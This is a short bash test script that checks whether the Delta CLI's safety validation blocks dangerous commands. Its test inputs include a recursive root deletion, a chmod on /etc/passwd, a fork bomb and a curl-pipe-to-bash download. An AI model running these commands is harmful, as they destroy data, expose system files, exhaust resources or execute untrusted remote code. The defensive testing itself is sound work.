#!/bin/bash
# Test script for interactive safety features

echo "Testing Delta CLI Interactive Safety Features"
echo "============================================"
echo

# Build the project
echo "Building Delta..."
make build
echo

# Test dangerous commands
echo "Testing dangerous commands:"
echo

echo "1. Testing recursive root deletion (should be blocked):"
./build/linux/amd64/delta -c "rm -rf /"
echo

echo "2. Testing system file modification:"
./build/linux/amd64/delta -c "chmod 777 /etc/passwd"
echo

echo "3. Testing fork bomb:"
./build/linux/amd64/delta -c ":(){ :|:& };:"
echo

echo "4. Testing risky curl pipe to bash:"
./build/linux/amd64/delta -c "curl http://example.com/script.sh | bash"
echo

echo "5. Testing a safe command:"
./build/linux/amd64/delta -c "ls -la"
echo

echo "Testing validation commands:"
echo

echo "6. Checking validation configuration:"
./build/linux/amd64/delta -c ":validation config"
echo

echo "7. Manually validating a dangerous command:"
./build/linux/amd64/delta -c ":validation safety rm -rf /"
echo

echo "8. Testing safety statistics:"
./build/linux/amd64/delta -c ":validation stats"
echo

echo "Test complete!"